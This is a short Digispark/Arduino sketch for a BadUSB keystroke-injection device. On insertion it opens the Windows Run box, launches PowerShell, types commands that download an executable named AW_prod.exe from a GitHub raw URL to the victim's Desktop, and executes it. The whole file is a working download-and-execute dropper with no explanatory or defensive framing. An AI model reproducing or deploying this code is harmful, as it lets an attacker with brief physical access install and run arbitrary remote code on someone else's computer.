#include "DigiKeyboard.h"

void setup() {

}

void loop()
{
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("powershell.exe");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    DigiKeyboard.println("[Net.ServicePointManager]::SecurityProtocol =");
    DigiKeyboard.println("[Net.SecurityProtocolType]::Tls12");
    DigiKeyboard.println("$down = New-Object System.Net.WebClient");
    DigiKeyboard.println("$url = \"https://github.com/alaminkhanakib/testing-/blob/main/AW_prod.exe?raw=true\"");
    DigiKeyboard.println("$file = \"$($env:USERPROFILE)/Desktop/AW_prod.exe\"");
    DigiKeyboard.println("$down.DownloadFile($url,$file)");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("$exec = New-Object -com shell.application");
    DigiKeyboard.println("$exec.shellexecute($file)");
    DigiKeyboard.delay(5000);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(90000000);
}